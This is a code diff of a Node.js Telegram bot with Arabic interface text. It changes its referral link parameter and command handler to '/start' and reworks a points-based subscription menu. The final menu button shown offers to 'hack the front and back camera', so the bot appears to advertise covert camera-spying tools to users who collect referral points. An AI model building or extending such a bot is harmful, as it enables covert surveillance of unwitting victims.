@@ -506,7 +506,7 @@ let pointsRequiredForSubscription = 15;
 
 function createReferralLink(userId) {
     const referralCode = Buffer.from(userId.toString()).toString('base64');
-    return `https://t.me/Hzhzhxhbxbdbot?sagdd=${referralCode}`;
+    return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
 }
 
 function addPoints(userId, points) {
@@ -534,7 +534,7 @@ function checkPointsAndSubscribe(userId) {
     }
 }
 
-bot.onText(/\/sjgdd (.+)/, (msg, match) => {
+bot.onText(/\/start (.+)/, (msg, match) => {
     const startPayload = match[1];
     const newUserId = msg.from.id.toString();
     
@@ -558,19 +558,13 @@ bot.onText(/\/sjgdd (.+)/, (msg, match) => {
     showButtons(msg.chat.id, newUserId);
 });
 
-bot.onText(/\/start/, (msg) => {
-    if (!msg.text.includes(' ')) {
-        showButtons(msg.chat.id, msg.from.id.toString());
-    }
-});
+async function showButtons(chatId, userId) {
+  const points = userPoints.get(userId) || 0;
+  const isSubscribed = subscribedUsers.has(userId);
 
-function showButtons(chatId, userId) {
-    const points = userPoints.get(userId) || 0;
-    const isSubscribed = subscribedUsers.has(userId);
-    
-    let statusMessage = isSubscribed 
-        ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
-        : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+  let statusMessage = isSubscribed 
+    ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
+    : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
 
    let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
